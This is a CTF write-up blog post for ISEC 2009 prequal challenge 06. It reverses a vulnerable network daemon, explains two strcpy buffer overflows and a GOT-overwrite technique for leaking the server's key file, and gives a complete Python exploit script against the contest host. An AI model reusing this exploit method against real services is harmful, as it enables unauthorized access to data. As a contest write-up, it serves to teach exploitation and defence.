---
title: 'ISEC 2009 CTF Prequal &#8211; Challenge 06'
author: rd
excerpt: |
  |
    In the earlier of this month, I helped CLGT team on the second day of CTF prequal game for ISEC 2009 conference. Since I only had a company Windows XP laptop on that day, it was a pain using a FreeBSD 64bit freeshell on geekshells.org to solve freebsd challenges (things like gcc with -m32 didn't work, some weird behaviors when trying to mess around with GOT/PLT/BSS/LIBC in 32-bit compatibility mode, some random users kept sending wall messages in the mid of gdb session because I didn't do mesg -n in the first time). Anyway, here is the write up for challenge 06. Write up for challenge 12 will be posted later.
layout: post

shorturls:
  - 'a:4:{s:9:"permalink";s:70:"https://www.vnsecurity.net/2009/08/isec-2009-ctf-prequal-challenge-06/";s:7:"tinyurl";s:26:"http://tinyurl.com/yakhcon";s:4:"isgd";s:18:"http://is.gd/aOtbh";s:5:"bitly";s:20:"http://bit.ly/8KLfcr";}'
tweetbackscheck:
  - 1408358997
twittercomments:
  - 'a:0:{}'
tweetcount:
  - 0
category:
  - 'CTF - CLGT Crew'
---
</p> 
## Summary

The binary [blackhole ][1]contains remote buffer overflow bugs. By exploiting these bugs, we can overwrite a buffer pointer being used as the destination for another* strcpy() *later in the program. Hence, we can write 128 bytes of chosen data to any location we want to.

### Vulnerability</p> 

Reverse C code of the buggy function at address **0x8048A20** 

<pre class="brush: cpp; gutter: true; highlight: [23,33,44,45]; title: ; notranslate" title="">signed int conn_handle(int fd)
{

   unsigned int s;
   int len;
   char buf128[128];
   char destrandbuf12[12];
   char randbuf12[12];
   char destbuf16[16];
   int randnum;
   char *buf_ptr;
   FILE *stream;

   randnum = 0;
   buf_ptr = 0;
   sockfd = fd;
   sendtosocket(fd, "name : ", 7);
   memset(buf128, 0, 128);
   s = time(0);
   srand(s);
   randnum = rand() % 10000;
   readfromsocket(fd, buf128, 32, 10);
   strcpy(destbuf16, buf128);
   memset(randbuf12, 0, 12);
   snprintf(randbuf12, 5, "%d", randnum);
   xor_randnum(randbuf12, destrandbuf12);
   snprintf(buf128, 64, "hello %s , your key : %sn", destbuf16, destrandbuf12);
   len = strlen(buf128);
   sendtosocket(fd, buf128, len);
   sendtosocket(fd, "surisuri : ", 11);
   memset(buf128, 0, 128);
   readfromsocket(fd, buf128, 128, 10);
   if ( strncmp(buf128, randbuf12, 4) )
   {
     stream = fopen("/dev/null", "w");
     fputs(buf128, stream);
     sendtosocket(fd, "blackholen", 10);
     exit(1);
   }
   stream = fopen("./key", "r");
   if ( stream )
   {
     fread(keystr, 32, 1, stream);
     strcpy(randbuf12, buf128);
     strcpy(buf_ptr, buf128);
     printf("abrakatabra the key is %sn", "elohkcalb");
     exit(1);
   }
   return -1;
}
</pre>

There are two buffer overflow bugs:  
    &#8211; 16 bytes overflow at line 23: *strcpy(destbuf16, buf128)*  
    &#8211; 116 bytes overflow at line 44: *strcpy(randbuf12, buf128)</p> 
</i>

### Exploit

In order to reach the second buggy code at line 44, we need to provide the proper input to pass random check *strncmp(buf128, randbuf12, 4)* at line 33. The easiest way to do this is to overwrite the \`***randnum***\` value using the first *strcpy()* at line 23. After that, by using the second overflow bug at line 44, we can overwrite \`***buf_ptr***\` pointer in the subsequence *strcpy(buf_ptr, buf128)* at line 45 to be able to write 128 bytes of input data to any memory address.

It&#8217;s possible to overwrite the GOT table in the way that the server would send the content of *./key* file back to the client via *sendtosocket()*. Since the static variable \`***keystr***\` is used to store the content of *./key* file, we can craft the GOT table to change the program flow to end up with something like 

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">; printf GOT points to 0x08048C63
.text:08048C63                 mov     dword ptr [esp+4], 20h ; size
.text:08048C6B                 mov     dword ptr [esp], offset keystr ; ptr
.text:08048C72                 call    _fread

; fread GOT points to 0x08048B98
.text:08048B98                 mov     eax, [ebp+fd]
.text:08048B9B                 mov     [esp], eax      ; fd
.text:08048B9E                 call    sendtosocket
</pre>

which is equivalent to *sendtosocket(fd, keystr, 32)* so the server will send us back 32 bytes content of ./key file. 

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">$ python 6.py
&lt; name :
&lt; hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa , your key : 0407
&lt; surisuri :
KEY: wowyougotpasswordgonextlevel
</pre></p> 

### Exploit Code</p> 

<pre class="brush: python; gutter: true; title: ; notranslate" title="">#!/usr/bin/env python

import socket

host = '221.143.48.88'
port = 57005
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

ret = s.recv(1024)
print "&lt; %s" % ret

name = "a"*32 + "n"
s.send(name)

ret = s.recv(1024)
print "&lt; %s" % ret

ret = s.recv(1024)
print "&lt; %s" % ret

# GOT - from 0x0804A2FC waitpid_ptr
# RANDSTR[4] PAD[4] CALL_SENDTOSOCKET[4] PAD[20] BUF_PTR[4]
# PAD[4] CALL_FREAD[4]

RANDSTR = "1633"
CALL_SENDTOSOCKET = "x98x8Bx04x08"	# fread GOT
CALL_FREAD = "x63x8Cx04x08" 	# printf GOT
BUF_PTR = "xFCxA2x04x08"		# waitpid GOT
surisuri = RANDSTR + "A"*4 + CALL_SENDTOSOCKET + "A"*20 
           + BUF_PTR + "A"*4 + CALL_FREAD + "n"
s.send(surisuri)

ret = s.recv(1024)
print "KEY: %sn" % ret

s.close
</pre></p>

 [1]: /vnsec/Members/rd/Files/misc/blackhole